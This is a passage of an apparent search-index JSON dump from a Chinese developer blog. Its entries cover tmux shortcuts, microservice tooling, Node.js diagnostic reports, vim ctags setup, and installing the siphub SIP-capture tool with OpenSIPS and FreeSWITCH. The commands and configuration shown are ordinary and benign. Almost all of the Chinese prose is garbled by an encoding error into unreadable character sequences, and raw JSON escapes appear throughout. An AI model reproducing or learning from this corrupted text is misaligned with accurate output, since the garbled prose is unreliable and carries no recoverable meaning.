åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªwindow: ctrl-b nÂ æŒ‰åºå·åˆ‡æ¢åˆ°åˆ¶å®šçš„window: ctrl-b æ•°å­—Â æ•°å­—å¯ä»¥ç”¨0-9 panesæ“ä½œ paneç›¸å½“äºåˆ†å±ï¼Œæ‰€æœ‰paneéƒ½æ˜¯åœ¨ä¸€ä¸ªçª—å£é‡Œéƒ½æ˜¾ç¤ºå‡ºæ¥çš„ã€‚è¿™ç‚¹å’Œwindowä¸åŒï¼Œä¸€ä¸ªwindowæ˜¾ç¤ºå‡ºæ¥ï¼Œåˆ™æ„å‘³ç€å…¶ä»–windowæ˜¯éšè—çš„ã€‚\nåœ¨åšä»£ç å¯¹æ¯”ï¼Œæˆ–è€…ä¸€éå‚è€ƒå¦ä¸€ä¸ªä»£ç ï¼Œä¸€éå†™å½“å‰ä»£ç æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨paneåˆ†å±ã€‚\nå‚ç›´åˆ†å±: ctrl-b %Â æ°´å¹³åˆ†å±: ctrl-b \u0026quot;Â ä¾æ¬¡åˆ‡æ¢: ctrl-b oÂ æŒ‰ç®­å¤´é”®åˆ‡æ¢: ctrl-b ç®­å¤´Â é‡æ–°å¸ƒå±€: ctrl-b ç©ºæ ¼é”®Â æœ€å¤§åŒ–å½“å‰pane: ctrl-b zÂ å…³é—­å½“å‰pane: ctrl-b xÂ å°†panneè½¬ä¸ºæ–°çš„window: ctrl-b !Â æ˜¾ç¤ºPannelç¼–å· ctrl-b q å‘å·¦ç§»åŠ¨pannel ctrl-b { å‘å³ç§»åŠ¨pannel ctrl-b } resize panne\nresize-pane -D 20 resize down resize-pane -U 20 resize up resize-pane -L 20 resize left resize-pane -R 20 resize right æ‚é¡¹ æŸ¥çœ‹æ—¶é—´ï¼š ctrl-b tÂ å†…éƒ¨æ“ä½œ å½“ä½ å·²ç»è¿›å…¥tmuxæ—¶ï¼Œå¦‚ä½•æ–°å»ºä¸€ä¸ªsessionæˆ–è€…å…³é—­ä¸€ä¸ªsessionå‘¢ï¼Ÿ\næ–°å»ºsession ctrl-b :Â è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼Œç„¶åè¾“å…¥ï¼š new -s session-nameÂ å…³é—­sesssion ctrl-b : è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼Œç„¶åè¾“å…¥ï¼š kill-session -t session-nameÂ tmux è®¾ç½®æ´»è·ƒwindowçš„çŠ¶æ€æ èƒŒæ™¯è‰² # tmux 1.x set-window-option -g window-status-current-bg red # tmux 2.9 setw -g window-status-current-style fg=black,bg=white å‚è€ƒ https://unix.stackexchange.com/questions/210174/set-the-active-tmux-tab-color ","permalink":"https://wdd.js.org/posts/2020/08/osz3gu/","summary":"tmuxä½¿ç”¨åœºæ™¯ è¿œç¨‹sshè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œæœ€éš¾å—çš„æ˜¯éšæ—¶æœ‰å¯èƒ½sshæ‰çº¿ï¼Œç„¶åä¸€åˆ‡éƒ½éœ€è¦èŠ±é¢å¤–çš„æ—¶é—´é‡æ–°æ¢å¤ï¼Œä¹Ÿæœ‰å¯èƒ½ä¸€äº›å·¥ä½œåªèƒ½é‡æ–°å¼€å§‹ã€‚\nåœ¨æ¥ç»­ä»‹ç»tmuxä¹‹å‰ï¼Œå…ˆè¯´è¯´moshã€‚\nã€moshæ¶æ„å›¾ã€‘\næˆ‘æ›¾ä½¿ç”¨è¿‡mosh, æ®è¯´moshæ°¸è¿œä¸ä¼šæ‰çº¿ã€‚å®é™…ä¸Šæœ‰å¯èƒ½çš„ç¡®å¦‚æ­¤ï¼Œä½†æ˜¯moshå®é™…ä¸Šå®‰è£…æ¯”è¾ƒéº»çƒ¦ã€‚moshéœ€è¦åœ¨æœåŠ¡ç«¯å®‰è£…server, ç„¶åè¦åœ¨ä½ æœ¬åœ°çš„ç”µè„‘ä¸Šå®‰è£…client, ç„¶åé€šè¿‡è¿™ä¸ªclientå»è¿æ¥moshæœåŠ¡ç«¯çš„å®ˆæŠ¤è¿›ç¨‹ã€‚moshéœ€è¦å®‰è£…åœ¨å®¢æˆ·ç«¯æœåŠ¡ç«¯éƒ½å®‰è£…è½¯ä»¶ï¼Œç„¶åå¯èƒ½è¿˜è¦è®¾ç½®ä¸€ä¸‹ç½‘ç»œç­–ç•¥ï¼Œæ‰èƒ½çœŸæ­£ä½¿ç”¨ã€‚\nmoshéœ€è¦æ”¹å˜å¾ˆå¤šï¼Œè¿™åœ¨ç”Ÿäº§ç¯å¢ƒæ˜¯ä¸å¯èƒ½çš„ã€‚å¦å¤–å³ä½¿æ˜¯è‡ªå·±çš„å¼€å‘ç¯å¢ƒï¼Œè¿™æ ·æèµ·æ¥ä¹Ÿæ˜¯æ¯”è¾ƒéº»çƒ¦çš„ã€‚\nä¸‹å›¾æ˜¯tmuxçš„æ¶æ„å›¾ã€‚å®é™…ä¸Šæˆ‘ä»¬åªéœ€è¦åœ¨æœåŠ¡ç«¯å®‰è£…tmux, å‰©ä¸‹çš„sshçš„è¿æ¥éƒ½å¯ä»¥ç”¨æ ‡å‡†çš„åŠŸèƒ½ã€‚ ã€tmuxæ¶æ„å›¾ã€‘\ntmuxæ¦‚å¿µï¼šsesssion, window, panes æ¦‚å¿µä¸æ¸…æ¥šï¼Œå¾€å¾€æ˜¯è§‰å¾—tmuxéš¾ç”¨çš„å…³é”®ç‚¹ã€‚\nsessionä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ï¼Œtmuxå¯ä»¥å¯åŠ¨å¤šä¸ªsession ä¸€ä¸ªsessionå¯ä»¥æœ‰å¤šä¸ªwindow ä¸€ä¸ªwindowå¯ä»¥æœ‰å¤šä¸ªpanes åœ¨tmuxä¸­æŒ‰ctrl-b w, å¯ä»¥åœ¨sesionï¼Œwindowå’Œpanelä¹‹é—´è·³è½¬ã€‚\næ³¨æ„ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªsesioné»˜è®¤ä¼šæ‰“å¼€ä¸€ä¸ªwindow, ä¸€ä¸ªwindowä¼šé»˜è®¤æ‰“å¼€ä¸€ä¸ªpaneã€‚\nsessionæ“ä½œ åˆ›å»ºæ–°çš„sesssion: tmux new -s some_nameÂ è„±ç¦»session: ctrl-b +dÂ æ³¨æ„å³ä½¿è„±ç¦»sessionï¼Œ sessionä¸­çš„å†…å®¹è¿˜æ˜¯åœ¨ç»§ç»­å·¥ä½œçš„ è¿›å…¥æŸä¸ªsession: tmux attach -t some_nameÂ æŸ¥çœ‹sesionåˆ—è¡¨: tmux lsÂ killæŸä¸ªsession: tmux kill-session -t some_nameÂ killæ‰€æœ‰session: tmux kill-serverÂ é‡å‘½åsession: ctrl-b $Â é€‰æ‹©session: ctrl-b sÂ windowæ“ä½œ æ–°å»º: ctrl-b cÂ æŸ¥çœ‹åˆ—è¡¨: ctrl-b wÂ å…³é—­å½“å‰window: ctrl-b \u0026amp;Â é‡å‘½åå½“å‰window: ctrl-b ,Â åˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªwindow: ctrl-b pÂ åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªwindow: ctrl-b nÂ æŒ‰åºå·åˆ‡æ¢åˆ°åˆ¶å®šçš„window: ctrl-b æ•°å­—Â æ•°å­—å¯ä»¥ç”¨0-9 panesæ“ä½œ paneç›¸å½“äºåˆ†å±ï¼Œæ‰€æœ‰paneéƒ½æ˜¯åœ¨ä¸€ä¸ªçª—å£é‡Œéƒ½æ˜¾ç¤ºå‡ºæ¥çš„ã€‚è¿™ç‚¹å’Œwindowä¸åŒï¼Œä¸€ä¸ªwindowæ˜¾ç¤ºå‡ºæ¥ï¼Œåˆ™æ„å‘³ç€å…¶ä»–windowæ˜¯éšè—çš„ã€‚","title":"tmuxæ·±åº¦æ•™å­¦"},{"content":"å…³é”®æŠ€æœ¯ Docker: å®¹å™¨ kuberneterï¼šæ¶æ„ä¸éƒ¨ç½² HELM: æ‰“åŒ…å’Œéƒ¨ç½² Prometheusï¼š ç›‘æ§ Open TRACING + ZIPKIN ï¼š åˆ†å¸ƒå¼è¿½è¸ª å…³é”®æ€§èƒ½æŒ‡æ ‡ I/O æ€§èƒ½: å¯åŠ¨è€—æ—¶: å½“æœåŠ¡å‡ºç°æ•…éšœï¼Œéœ€è¦é‡å¯æ—¶ï¼Œå¯åŠ¨çš„é€Ÿåº¦è¶Šå¿«ï¼Œå¯¹å®¢æˆ·çš„å½±å“è¶Šå°ã€‚ å†…å­˜ä½¿ç”¨: ","permalink":"https://wdd.js.org/posts/2020/08/lrzu06/","summary":"å…³é”®æŠ€æœ¯ Docker: å®¹å™¨ kuberneterï¼šæ¶æ„ä¸éƒ¨ç½² HELM: æ‰“åŒ…å’Œéƒ¨ç½² Prometheusï¼š ç›‘æ§ Open TRACING + ZIPKIN ï¼š åˆ†å¸ƒå¼è¿½è¸ª å…³é”®æ€§èƒ½æŒ‡æ ‡ I/O æ€§èƒ½: å¯åŠ¨è€—æ—¶: å½“æœåŠ¡å‡ºç°æ•…éšœï¼Œéœ€è¦é‡å¯æ—¶ï¼Œå¯åŠ¨çš„é€Ÿåº¦è¶Šå¿«ï¼Œå¯¹å®¢æˆ·çš„å½±å“è¶Šå°ã€‚ å†…å­˜ä½¿ç”¨: ","title":"æ‰“é€ é«˜å¯æ‰©å±•æ€§çš„å¾®æœåŠ¡"},{"content":"åœ¨v11.7.0ä¸­åŠ å…¥å®éªŒæ€§åŠŸèƒ½ï¼Œè¯Šæ–­æŠ¥å‘Šã€‚è¯Šæ–­æŠ¥å‘Šçš„è¾“å‡ºæ˜¯ä¸€ä¸ªjsonæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¿¡æ¯ã€‚\nè¿›ç¨‹ä¿¡æ¯ æ“ä½œç³»ç»Ÿä¿¡æ¯ å †æ ˆä¿¡æ¯ å†…å­˜èµ„æºä½¿ç”¨ libuvçŠ¶æ€ ç¯å¢ƒå˜é‡ å…±äº«åº“ è¯Šæ–­æŠ¥å‘Šçš„åŸå§‹ä¿¡æ¯ å¦‚ä½•äº§ç”Ÿè¯Šæ–­æŠ¥å‘Š å¿…éœ€ä½¿ç”¨ \u0026ndash;experimental-report æ¥å¯ç”¨ process.report.writeReport() æ¥è¾“å‡ºè¯Šæ–­æŠ¥å‘Š node --experimental-report --diagnostic-report-filename=YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt --eval \u0026#34;process.report.writeReport(\u0026#39;report.json\u0026#39;)\u0026#34; Writing Node.js report to file: report.json Node.js report completed ç”¨ç¼–è¾‘å™¨æ‰“å¼€è¯Šæ–­æŠ¥å‘Šï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹ã€‚\nå¦‚ä½•ä»è¯Šæ–­æŠ¥å‘Šä¸­åˆ†æé—®é¢˜ï¼Ÿ è¯Šæ–­æŠ¥å‘Šå¾ˆé•¿ï¼Œä¸å¤ªå¥½ç†è§£ã€‚IBMå¼€å‘äº†report-toolkitå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥åˆ†æã€‚ è¦æ±‚ï¼šnode \u0026gt; 11.8.0\nnpm install report-toolkit --global æˆ–è€… yarn global add report-toolkit æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯\nrtk --help è‡ªåŠ¨å‡ºå‘æŠ¥å‘Š node --experimental-report \\ --diagnostic-report-on-fatalerror \\ --diagnostic-report-uncaught-exception \\ index.js $ node â€“help grep report --experimental-report enable report generation å¯ç”¨reportåŠŸèƒ½ --diagnostic-report-on-fatalerror generate diagnostic report on fatal (internal) errors äº§ç”ŸæŠ¥å‘Šå½“å‘ç”Ÿè‡´å‘½é”™è¯¯ --diagnostic-report-on-signal generate diagnostic report upon receiving signals äº§ç”ŸæŠ¥å‘Šå½“æ”¶åˆ°ä¿¡å· --diagnostic-report-signal=... causes diagnostic report to be produced on provided signal. Unsupported in Windows. (default: SIGUSR2) --diagnostic-report-uncaught-exception generate diagnostic report on uncaught exceptions äº§ç”ŸæŠ¥å‘Šå½“å‡ºç°æœªæ•è·çš„å¼‚å¸¸ --diagnostic-report-directory=... define custom report pathname. (default: current working directory of Node.js process) --diagnostic-report-filename=... define custom report file name. (default: YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt) å‚è€ƒ https://nodejs.org/dist/latest-v12.x/docs/api/report.html https://ibm.github.io/report-toolkit/quick-start https://developer.ibm.com/technologies/node-js/articles/introducing-report-toolkit-for-nodejs-diagnostic-reports ","permalink":"https://wdd.js.org/fe/nodejs-report/","summary":"åœ¨v11.7.0ä¸­åŠ å…¥å®éªŒæ€§åŠŸèƒ½ï¼Œè¯Šæ–­æŠ¥å‘Šã€‚è¯Šæ–­æŠ¥å‘Šçš„è¾“å‡ºæ˜¯ä¸€ä¸ªjsonæ–‡ä»¶ï¼ŒåŒ…æ‹¬ä»¥ä¸‹ä¿¡æ¯ã€‚\nè¿›ç¨‹ä¿¡æ¯ æ“ä½œç³»ç»Ÿä¿¡æ¯ å †æ ˆä¿¡æ¯ å†…å­˜èµ„æºä½¿ç”¨ libuvçŠ¶æ€ ç¯å¢ƒå˜é‡ å…±äº«åº“ è¯Šæ–­æŠ¥å‘Šçš„åŸå§‹ä¿¡æ¯ å¦‚ä½•äº§ç”Ÿè¯Šæ–­æŠ¥å‘Š å¿…éœ€ä½¿ç”¨ \u0026ndash;experimental-report æ¥å¯ç”¨ process.report.writeReport() æ¥è¾“å‡ºè¯Šæ–­æŠ¥å‘Š node --experimental-report --diagnostic-report-filename=YYYYMMDD.HHMMSS.PID.SEQUENCE#.txt --eval \u0026#34;process.report.writeReport(\u0026#39;report.json\u0026#39;)\u0026#34; Writing Node.js report to file: report.json Node.js report completed ç”¨ç¼–è¾‘å™¨æ‰“å¼€è¯Šæ–­æŠ¥å‘Šï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼ä¸‹é¢çš„å†…å®¹ã€‚\nå¦‚ä½•ä»è¯Šæ–­æŠ¥å‘Šä¸­åˆ†æé—®é¢˜ï¼Ÿ è¯Šæ–­æŠ¥å‘Šå¾ˆé•¿ï¼Œä¸å¤ªå¥½ç†è§£ã€‚IBMå¼€å‘äº†report-toolkitå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥åˆ†æã€‚ è¦æ±‚ï¼šnode \u0026gt; 11.8.0\nnpm install report-toolkit --global æˆ–è€… yarn global add report-toolkit æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯\nrtk --help è‡ªåŠ¨å‡ºå‘æŠ¥å‘Š node --experimental-report \\ --diagnostic-report-on-fatalerror \\ --diagnostic-report-uncaught-exception \\ index.js $ node â€“help grep report --experimental-report enable report generation å¯ç”¨reportåŠŸèƒ½ --diagnostic-report-on-fatalerror generate diagnostic report on fatal (internal) errors äº§ç”ŸæŠ¥å‘Šå½“å‘ç”Ÿè‡´å‘½é”™è¯¯ --diagnostic-report-on-signal generate diagnostic report upon receiving signals äº§ç”ŸæŠ¥å‘Šå½“æ”¶åˆ°ä¿¡å· --diagnostic-report-signal=.","title":"Nodejsè¯Šæ–­æŠ¥å‘Š"},{"content":"å®‰è£… # ubuntu or debian apt-get install ctags # centos yum install ctags # centos # macOSX brew install ctags æ³¨æ„ï¼Œå¦‚æœåœ¨macOS ä¸Šè¾“å…¥ctags -R, å¯èƒ½ä¼šæœ‰æŠ¥é”™ /Library/Developer/CommandLineTools/usr/bin/ctags: illegal option -- R usage: ctags [-BFadtuwvx] [-f tagsfile] file ... é‚£ä¹ˆä½ å¯ä»¥è¾“å…¥which ctags: /usr/bin/ctags # å¦‚æœè¾“å‡ºæ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆè·¯å¾„å°±æ˜¯é”™çš„ã€‚æ­£ç¡®çš„ç›®å½•åº”è¯¥æ˜¯/usr/local/bin/ctags é‚£ä¹ˆä½ å¯ä»¥åœ¨ä½ çš„.zshrcæˆ–è€…å…¶ä»–é…ç½®æ–‡ä»¶ä¸­ï¼Œå¢åŠ ä¸€ä¸ªalias alias ctags=\u0026#34;/usr/local/bin/ctags\u0026#34; ä½¿ç”¨ è¿›å…¥åˆ°é¡¹ç›®è·Ÿç›®å½•\nctags -R # å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ç”Ÿæˆctagsæ–‡ä»¶ è¿›å…¥vim vim main.c # :set tags=$PWD/tags #è®©vimè¯»åŒºå½“å‰æ–‡ä»¶ä¸‹çš„ctagsæ–‡ä»¶ # åœ¨å¤šä¸ªæ–‡ä»¶çš„åœºæ™¯ä¸‹ï¼Œæœ€å¥½ç”¨ç»å¯¹è·¯å¾„è®¾ç½®tagsæ–‡ä»¶çš„ä½ç½® # å¦åˆ™æœ‰å¯èƒ½ä¼šæŠ¥é”™neovim E433: No tags file å¿«æ·é”® Ctrl+] è·³è½¬åˆ°æ ‡ç­¾å®šä¹‰çš„åœ°æ–¹ Ctrl+o è·³åˆ°ä¹‹å‰çš„åœ°æ–¹ ctrl+t å›åˆ°è·³è½¬ä¹‹å‰çš„æ ‡ç­¾å¤„ :ptag some_key æ‰“å¼€æ–°çš„é¢æ¿é¢„è§ˆsome_keyçš„å®šä¹‰ ä¸‹ä¸€ä¸ªå®šä¹‰å¤„ ä¸Šä¸€ä¸ªå®šä¹‰å¤„ gd å½“å‰å‡½æ•°å†…æŸ¥æ‰¾å½“å‰æ ‡è¯†ç¬¦çš„å®šä¹‰å¤„ gD å½“å‰æ–‡ä»¶æŸ¥æ‰¾æ ‡è¯†ç¬¦çš„ç¬¬ä¸€æ¬¡å®šä¹‰å¤„ ","permalink":"https://wdd.js.org/posts/2020/08/ed6944/","summary":"å®‰è£… # ubuntu or debian apt-get install ctags # centos yum install ctags # centos # macOSX brew install ctags æ³¨æ„ï¼Œå¦‚æœåœ¨macOS ä¸Šè¾“å…¥ctags -R, å¯èƒ½ä¼šæœ‰æŠ¥é”™ /Library/Developer/CommandLineTools/usr/bin/ctags: illegal option -- R usage: ctags [-BFadtuwvx] [-f tagsfile] file ... é‚£ä¹ˆä½ å¯ä»¥è¾“å…¥which ctags: /usr/bin/ctags # å¦‚æœè¾“å‡ºæ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆè·¯å¾„å°±æ˜¯é”™çš„ã€‚æ­£ç¡®çš„ç›®å½•åº”è¯¥æ˜¯/usr/local/bin/ctags é‚£ä¹ˆä½ å¯ä»¥åœ¨ä½ çš„.zshrcæˆ–è€…å…¶ä»–é…ç½®æ–‡ä»¶ä¸­ï¼Œå¢åŠ ä¸€ä¸ªalias alias ctags=\u0026#34;/usr/local/bin/ctags\u0026#34; ä½¿ç”¨ è¿›å…¥åˆ°é¡¹ç›®è·Ÿç›®å½•\nctags -R # å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ç”Ÿæˆctagsæ–‡ä»¶ è¿›å…¥vim vim main.c # :set tags=$PWD/tags #è®©vimè¯»åŒºå½“å‰æ–‡ä»¶ä¸‹çš„ctagsæ–‡ä»¶ # åœ¨å¤šä¸ªæ–‡ä»¶çš„åœºæ™¯ä¸‹ï¼Œæœ€å¥½ç”¨ç»å¯¹è·¯å¾„è®¾ç½®tagsæ–‡ä»¶çš„ä½ç½® # å¦åˆ™æœ‰å¯èƒ½ä¼šæŠ¥é”™neovim E433: No tags file å¿«æ·é”® Ctrl+] è·³è½¬åˆ°æ ‡ç­¾å®šä¹‰çš„åœ°æ–¹ Ctrl+o è·³åˆ°ä¹‹å‰çš„åœ°æ–¹ ctrl+t å›åˆ°è·³è½¬ä¹‹å‰çš„æ ‡ç­¾å¤„ :ptag some_key æ‰“å¼€æ–°çš„é¢æ¿é¢„è§ˆsome_keyçš„å®šä¹‰ ä¸‹ä¸€ä¸ªå®šä¹‰å¤„ ä¸Šä¸€ä¸ªå®šä¹‰å¤„ gd å½“å‰å‡½æ•°å†…æŸ¥æ‰¾å½“å‰æ ‡è¯†ç¬¦çš„å®šä¹‰å¤„ gD å½“å‰æ–‡ä»¶æŸ¥æ‰¾æ ‡è¯†ç¬¦çš„ç¬¬ä¸€æ¬¡å®šä¹‰å¤„ ","title":"vim ctagså®‰è£…åŠä½¿ç”¨"},{"content":"oæˆ‘å†™siphubçš„åŸå› æ˜¯homerå¤ªéš¾ç”¨äº†ï¼ï¼ç»å¸¸æŸ¥ä¸åˆ°æƒ³æŸ¥çš„æ•°æ®ï¼ŒæŸ¥è¯¢çš„é€Ÿåº¦ä¹Ÿå¾ˆæ…¢ã€‚\né¡¹ç›®åœ°å€ï¼šhttps://github.com/wangduanduan/siphub\næ¶æ„ SIPæœåŠ¡å™¨ä¾‹å¦‚OpenSIPSæˆ–è€…FSå¯ä»¥é€šè¿‡hepåè®®å°†æ•°æ®å†™åˆ°siphub, siphubå°†æ•°æ®è§„æ•´ä¹‹åå†™å…¥MySql, siphubåŒæ—¶ä¹Ÿæä¾›Webé¡µé¢æ¥æŸ¥è¯¢å’Œå±•ç¤ºSIPæ¶ˆæ¯ã€‚ åŠŸèƒ½ä»‹ç» sip-hubæ˜¯ä¸€ä¸ªä¸“æ³¨sipä¿¡ä»¤çš„æœç´¢ä»¥åŠæ—¶åºå›¾å¯è§†åŒ–å±•ç¤ºçš„æœåŠ¡ã€‚\nç›¸æ¯”äºHomer, sip-hubåšäº†å¤§é‡çš„åŠŸèƒ½ç®€åŒ–ã€‚åŒæ—¶ä¹Ÿæä¾›äº†ä¸€äº›ä¸ªæ€§åŒ–çš„æŸ¥è¯¢ï¼Œä¾‹å¦‚è¢«å«åç¼€æŸ¥è¯¢ï¼Œä»…åŸŸåæŸ¥è¯¢ç­‰ã€‚\nsip-hubæœåŠ¡ä»…æœ‰3ä¸ªé¡µé¢\nsipæ¶ˆæ¯æœç´¢é¡µé¢ï¼Œç”¨äºæŒ‰ç…§ä¸»è¢«å«ã€åŸŸåå’Œæ—¶é—´èŒƒå›´æœç´¢å‘¼å«è®°å½• æ—¶åºå›¾å±•ç¤ºé¡µé¢ï¼Œç”¨äºå±•ç¤ºSIPæ—¶åºå›¾å’ŒåŸå§‹SIPæ¶ˆæ¯ å¯ä»¥å¯¼å…¥å¯¼å‡ºSIPæ¶ˆæ¯ å¯ä»¥æŸ¥æ‰¾A-Leg ç›‘æ§åŠŸèƒ½ å¤§é‡ç®€åŒ–æœç´¢ç»“æœé¡µé¢ã€‚siphubçš„æœç´¢ç»“æœé¡µé¢ï¼Œæ¯ä¸ªcallIdç›¸åŒçš„æ¶ˆæ¯ï¼Œåªå±•ç¤ºä¸€æ¡ã€‚ ç›¸å…³æˆªå›¾ æœç´¢é¡µé¢ siphubçš„æœç´¢ç»“æœä»…ä»…å±•ç¤ºcallIdç›¸åŒçš„æœ€æ—©çš„ä¸€æ¡è®°å½•ï¼Œè¿™æ ·å°±é¿å…äº†åƒhomeré‚£ç§ï¼Œçœ‹èµ·æ¥å¾ˆå¤šä¸ªæ¶ˆæ¯ï¼Œå®é™…ä¸Šéƒ½æ˜¯å±äºä¸€ä¸ªINVITEçš„ã€‚ Fromå­—æ®µå’ŒToå­—æ®µéƒ½æ”¯æŒåŸŸåæŸ¥è¯¢ï¼š@test.cc Fromå­—æ®µä¹Ÿæ”¯æŒåç¼€æŸ¥è¯¢ï¼Œä¾‹å¦‚1234è¿™ç§å·ç ï¼Œå¯ä»¥åªè¾“å…¥234å°±èƒ½æŸ¥åˆ°ï¼Œä½†æ˜¯åç¼€è¦å†™å®Œæ•´ï¼ŒåªæŸ¥23æ˜¯æŸ¥ä¸åˆ°çš„ã€‚ Toå­—æ®µä»…ä»…æ”¯æŒç²¾ç¡®æŸ¥è¯¢ ä¿¡ä»¤å±•ç¤ºé¡µé¢ ç‚¹å‡»å¯¹åº”çš„æ¶ˆæ¯ï¼Œè¯¦æƒ…ä¹Ÿä¼šè‡ªåŠ¨è·³è½¬å‡ºæ¥ã€‚ å®‰è£… é¦–å…ˆéœ€è¦å®‰è£…MySqlæ•°æ®åº“ï¼Œå¹¶åœ¨å…¶ä¸­å»ºç«‹ä¸€ä¸ªåä¸ºsiphubçš„æ•°æ®åº“ è¿è¡Œ dbHost æ•°æ®åº“åœ°å€ dbUser æ•°æ®åº“ç”¨æˆ· dbName æ•°æ®åº“å dataKeepDays æŠ“åŒ…ä¿å­˜å¤©æ•° 3000ç«¯å£æ˜¯webé¡µé¢ç«¯å£ 9060æ˜¯hepæ¶ˆæ¯æ”¶å–ç«¯å£ docker run -d -p 3000:3000 -p 9060:9060/udp \\ --env NODE_ENV=production \\ --env dbHost=1.2.3.4 \\ --env dbUser=root \\ --env dbPwd=123456 \\ --env dbName=siphub \\ --env dataKeepDays=3 \\ --name siphub wangduanduan/siphub é›†æˆ OpenSIPSé›†æˆ test witch OpenSIPS 2.4\n# add hep listen listen=hep_udp:your_ip:9061 loadmodule \u0026#34;proto_hep.so\u0026#34; # replace SIP_HUB_IP_PORT with siphubâ€˜s ip:port modparam(\u0026#34;proto_hep\u0026#34;, \u0026#34;hep_id\u0026#34;,\u0026#34;[hep_dst] SIP_HUB_IP_PORT;transport=udp;version=3\u0026#34;) loadmodule \u0026#34;siptrace.so\u0026#34; modparam(\u0026#34;siptrace\u0026#34;, \u0026#34;trace_id\u0026#34;,\u0026#34;[tid]uri=hep:hep_dst\u0026#34;) # add ite in request route(); if(!is_method(\u0026#34;REGISTER\u0026#34;) \u0026amp;\u0026amp; !has_totag()){ sip_trace(\u0026#34;tid\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;sip\u0026#34;); } FreeSWITCHé›†æˆ fs version ç‰ˆæœ¬è¦é«˜äº 1.6.8+\nç¼–è¾‘ï¼š sofia.conf.xml\nç”¨çœŸå®çš„siphub ip:portæ›¿æ¢SIP_HUB_IP_PORT\n\u0026lt;param name=\u0026#34;capture-server\u0026#34; value=\u0026#34;udp:SIP_HUB_IP_PORT\u0026#34;/\u0026gt; freeswitch@fsnode04\u0026gt; sofia global capture on +OK Global capture on freeswitch@fsnode04\u0026gt; sofia global capture off +OK Global capture off æ³¨æ„ï¼šsip_profilesé‡Œé¢çš„ä¹Ÿè¦è®¾ç½®ä¸ºyes\nsip_profiles/internal.xml \u0026lt;param name=\u0026#34;sip-capture\u0026#34; value=\u0026#34;yes\u0026#34;/\u0026gt; sip_profiles/external-ipv6.xml \u0026lt;param name=\u0026#34;sip-capture\u0026#34; value=\u0026#34;yes\u0026#34;/\u0026gt; sip_profiles/external.xml \u0026lt;param name=\u0026#34;sip-capture\u0026#34; value=\u0026#34;yes\u0026#34;/\u0026gt; ","permalink":"https://wdd.js.org/opensips/tools/siphub/","summary":"oæˆ‘å†™siphubçš„åŸå› æ˜¯homerå¤ªéš¾ç”¨äº†ï¼ï¼ç»å¸¸æŸ¥ä¸åˆ°æƒ³æŸ¥çš„æ•°æ®ï¼ŒæŸ¥è¯¢çš„é€Ÿåº¦ä¹Ÿå¾ˆæ…¢ã€‚\né¡¹ç›®åœ°å€ï¼šhttps://github.com/wangduanduan/siphub\næ¶æ„ SIPæœåŠ¡å™¨ä¾‹å¦‚OpenSIPSæˆ–è€…FSå¯ä»¥é€šè¿‡hepåè®®å°†æ•°æ®å†™åˆ°siphub, siphubå°†æ•°æ®è§„æ•´ä¹‹åå†™å…¥MySql, siphubåŒæ—¶ä¹Ÿæä¾›Webé¡µé¢æ¥æŸ¥è¯¢å’Œå±•ç¤ºSIPæ¶ˆæ¯ã€‚ åŠŸèƒ½ä»‹ç» sip-hubæ˜¯ä¸€ä¸ªä¸“æ³¨sipä¿¡ä»¤çš„æœç´¢ä»¥åŠæ—¶åºå›¾å¯è§†åŒ–å±•ç¤ºçš„æœåŠ¡ã€‚\nç›¸æ¯”äºHomer, sip-hubåšäº†å¤§é‡çš„åŠŸèƒ½ç®€åŒ–ã€‚åŒæ—¶ä¹Ÿæä¾›äº†ä¸€äº›ä¸ªæ€§åŒ–çš„æŸ¥è¯¢ï¼Œä¾‹å¦‚è¢«å«åç¼€æŸ¥è¯¢ï¼Œä»…åŸŸåæŸ¥è¯¢ç­‰ã€‚\nsip-hubæœåŠ¡ä»…æœ‰3ä¸ªé¡µé¢\nsipæ¶ˆæ¯æœç´¢é¡µé¢ï¼Œç”¨äºæŒ‰ç…§ä¸»è¢«å«ã€åŸŸåå’Œæ—¶é—´èŒƒå›´æœç´¢å‘¼å«è®°å½• æ—¶åºå›¾å±•ç¤ºé¡µé¢ï¼Œç”¨äºå±•ç¤ºSIPæ—¶åºå›¾å’ŒåŸå§‹SIPæ¶ˆæ¯ å¯ä»¥å¯¼å…¥å¯¼å‡ºSIPæ¶ˆæ¯ å¯ä»¥æŸ¥æ‰¾A-Leg ç›‘æ§åŠŸèƒ½ å¤§é‡ç®€åŒ–æœç´¢ç»“æœé¡µé¢ã€‚siphubçš„æœç´¢ç»“æœé¡µé¢ï¼Œæ¯ä¸ªcallIdç›¸åŒçš„æ¶ˆæ¯ï¼Œåªå±•ç¤ºä¸€æ¡ã€‚ ç›¸å…³æˆªå›¾ æœç´¢é¡µé¢ siphubçš„æœç´¢ç»“æœä»…ä»…å±•ç¤ºcallIdç›¸åŒçš„æœ€æ—©çš„ä¸€æ¡è®°å½•ï¼Œè¿™æ ·å°±é¿å…äº†åƒhomeré‚£ç§ï¼Œçœ‹èµ·æ¥å¾ˆå¤šä¸ªæ¶ˆæ¯ï¼Œå®é™…ä¸Šéƒ½æ˜¯å±äºä¸€ä¸ªINVITEçš„ã€‚ Fromå­—æ®µå’ŒToå­—æ®µéƒ½æ”¯æŒåŸŸåæŸ¥è¯¢ï¼š@test.cc 